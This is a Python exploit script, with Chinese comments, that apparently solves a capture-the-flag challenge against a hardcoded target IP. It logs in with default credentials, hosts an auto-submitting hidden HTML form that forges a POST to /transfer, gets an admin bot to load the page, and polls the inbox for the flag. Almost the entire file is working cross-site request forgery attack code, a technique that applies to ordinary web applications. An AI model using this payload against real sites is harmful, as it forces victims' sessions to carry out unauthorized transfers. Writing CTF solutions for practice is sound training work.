#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
16-csrf-post-transfer exploit
用法：
  python3 main.py --base http://47.120.76.57:34293 --wait 180

默认目标：
  修改 TARGET_URL，或用 --base 临时覆盖。
"""
import argparse
import re
import sys
import time
from urllib.parse import urljoin

import requests

FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
PAGE_RE = re.compile(r'href=["\'](/pages/[0-9a-fA-F]{12})["\']')

# 靶机地址变化时，只改这里即可。
TARGET_URL = "http://47.120.76.57:34293/"


def clean(s: str) -> str:
    s = re.sub(r"<script[\s\S]*?</script>", " ", s, flags=re.I)
    s = re.sub(r"<style[\s\S]*?</style>", " ", s, flags=re.I)
    s = re.sub(r"<[^>]+>", " ", s)
    s = re.sub(r"\s+", " ", s)
    return s.strip()


def req(session, method, url, **kwargs):
    kwargs.setdefault("timeout", 10)
    r = session.request(method, url, **kwargs)
    return r


def login(s: requests.Session, base: str, username: str, password: str):
    r = req(s, "POST", urljoin(base, "/login"), data={"username": username, "password": password}, allow_redirects=False)
    print(f"[*] login status={r.status_code} location={r.headers.get('Location')} cookies={s.cookies.get_dict()}")
    if r.status_code not in (302, 303) or not s.cookies.get_dict():
        print(clean(r.text)[:500])
        raise RuntimeError("登录失败：检查账号密码或目标地址")
    home = req(s, "GET", urljoin(base, "/"))
    if username not in home.text:
        print("[!] 登录后首页没有看到用户名，但继续尝试")
    print("[+] login ok")


def self_check_transfer(s: requests.Session, base: str, username: str):
    """验证 session 和字段是否正确。会 student->student 转 1，注意这不会消耗 admin 的第一笔 flag。"""
    r = req(s, "POST", urljoin(base, "/transfer"), data={"to": username, "amount": "1"}, allow_redirects=True)
    text = clean(r.text)
    print(f"[*] self-transfer status={r.status_code} final={r.url}")
    if "余额不足" in text or "金额必须" in text or "用户不存在" in text:
        raise RuntimeError("直连转账进入业务错误：" + text[:300])
    inbox = req(s, "GET", urljoin(base, "/inbox"))
    if username not in clean(inbox.text):
        raise RuntimeError("直连转账后收件箱没有变化，说明 session/接口可能异常")
    print("[+] self-transfer ok: 脚本确实能转账，CSRF 参数为 to/amount")


def host_payload(s: requests.Session, base: str, to_user: str, amount: str):
    # 用相对路径 /transfer，适配 bot 在 127.0.0.1 同源访问的情况。
    payload = f'''<!doctype html>
<html>
<body>
<form id="f" action="/transfer" method="post">
  <input type="hidden" name="to" value="{to_user}">
  <input type="hidden" name="amount" value="{amount}">
</form>
<script>
setTimeout(function(){{ document.getElementById('f').submit(); }}, 200);
</script>
</body>
</html>'''
    r = req(s, "POST", urljoin(base, "/pages/host"), data={"html": payload})
    m = PAGE_RE.search(r.text)
    print(f"[*] host status={r.status_code}")
    if not m:
        print(clean(r.text)[:1000])
        raise RuntimeError("托管失败：没有解析到 /pages/<12hex>")
    path = m.group(1)
    print(f"[+] hosted page: {path}")
    # 自检页面存在即可，不用本地浏览器访问，避免再产生 student->student 转账
    check = req(s, "GET", urljoin(base, path))
    print(f"[*] hosted check status={check.status_code} content-type={check.headers.get('content-type')}")
    return path


def submit_bot(s: requests.Session, base: str, path: str):
    # 重点：这里必须是相对路径 /pages/<id>，不要交完整 URL。
    r = req(s, "POST", urljoin(base, "/pages/submit"), data={"url": path})
    text = clean(r.text)
    print(f"[*] submit status={r.status_code}")
    print(f"[*] submit msg: {text[:300]}")
    if "仅允许" in text or "错误" in text or "不存在" in text:
        raise RuntimeError("提交 bot 被拒绝：" + text[:300])
    print("[+] bot submit ok")


def poll_flag(s: requests.Session, base: str, wait: int, interval: int):
    end = time.time() + wait
    last = ""
    i = 0
    while time.time() < end:
        i += 1
        r = req(s, "GET", urljoin(base, "/inbox"))
        text = r.text
        flags = FLAG_RE.findall(text)
        plain = clean(text)
        last = plain
        admin_hit = ("admin" in plain.lower()) or ("福利发放" in plain)
        print(f"[*] poll {i}: flag={bool(flags)} admin_msg={admin_hit} inbox_tail={plain[-160:]}")
        if flags:
            print(f"\n[+] FLAG: {flags[0]}")
            return flags[0]
        time.sleep(interval)
    print("\n[-] timeout: 没在等待时间内看到 flag")
    print("[*] last inbox:", last[-800:])
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=TARGET_URL, help=f"题目地址，默认 {TARGET_URL}")
    ap.add_argument("--user", default="student")
    ap.add_argument("--password", default="student")
    ap.add_argument("--to", default="student", help="让 admin 转给哪个用户")
    ap.add_argument("--amount", default="1")
    ap.add_argument("--wait", type=int, default=180, help="轮询等待秒数")
    ap.add_argument("--interval", type=int, default=5)
    ap.add_argument("--no-self-check", action="store_true", help="不做 student->student 直连转账自检")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    s = requests.Session()
    s.headers.update({"User-Agent": "CTF-CSRF-solver/1.0"})
    try:
        login(s, base, args.user, args.password)
        if not args.no_self_check:
            self_check_transfer(s, base, args.user)
        path = host_payload(s, base, args.to, args.amount)
        submit_bot(s, base, path)
        flag = poll_flag(s, base, args.wait, args.interval)
        if not flag:
            print("\n[!] 关键判断：")
            print("    1. 脚本直连转账已成功，说明登录和 /transfer 参数没问题。")
            print("    2. bot 只接受相对路径 /pages/<id>，本脚本已按这个提交。")
            print("    3. 若仍无 admin_msg，多半是 bot 队列/浏览器没跑，或实例状态异常；重开后立刻跑本脚本。")
            sys.exit(2)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
